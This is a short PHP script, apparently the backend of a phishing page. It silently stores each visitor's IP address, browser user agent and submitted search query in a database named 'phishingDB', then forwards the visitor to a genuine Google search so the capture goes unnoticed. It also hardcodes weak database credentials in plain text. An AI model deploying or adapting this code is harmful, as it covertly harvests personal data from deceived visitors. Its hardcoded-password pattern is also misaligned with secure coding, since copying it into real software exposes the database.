<?php
mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);

$server = "localhost";
$username = "php";
$password = "password";
$database = "phishingDB";

$conn = mysqli_connect($server, $username, $password, $database);
if (!$conn) {
    http_response_code(500);
    exit("DB connection failed");
}

$IP = $_SERVER["REMOTE_ADDR"] ?? '';
$agent = $_SERVER["HTTP_USER_AGENT"] ?? '';
$query = $_POST['query'] ?? '';

$stmt = $conn->prepare(
    "INSERT INTO phishList (IP, agent, `query`) VALUES (?, ?, ?)"
);
$stmt->bind_param("sss", $IP, $agent, $query);
$stmt->execute();

header("Location: https://www.google.com/search?q=" . urlencode($query));
exit;